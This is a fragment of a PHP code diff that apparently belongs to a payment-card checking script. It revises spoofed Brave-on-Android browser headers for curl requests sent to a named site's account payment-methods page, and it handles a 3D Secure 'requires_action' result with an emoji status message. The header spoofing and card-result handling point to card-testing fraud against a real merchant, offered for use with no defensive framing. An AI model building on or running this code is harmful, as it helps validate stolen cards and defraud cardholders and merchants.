-    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
+    'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
+    'sec-ch-ua-mobile: ?1',
     'sec-ch-ua-platform: "Android"',
+    'Upgrade-Insecure-Requests: 1',
+    'Sec-GPC: 1',
+    'Accept-Language: es-US,es;q=0.7',
+    'Sec-Fetch-Site: same-origin',
+    'Sec-Fetch-Mode: navigate',
+    'Sec-Fetch-User: ?1',
+    'Sec-Fetch-Dest: document',
     'Referer: https://hoamemberservices.com/my-account/payment-methods/',
   ],
 ]);
@@ -3097,8 +3137,6 @@ curl_setopt_array($curl, [
 $response = curl_exec($curl);
 $err = curl_error($curl);
 curl_close($curl);
-
-
 
 } elseif ($success === true && $status === "requires_action") {
     $respo = "3DS Authenticate Rejected ❌";
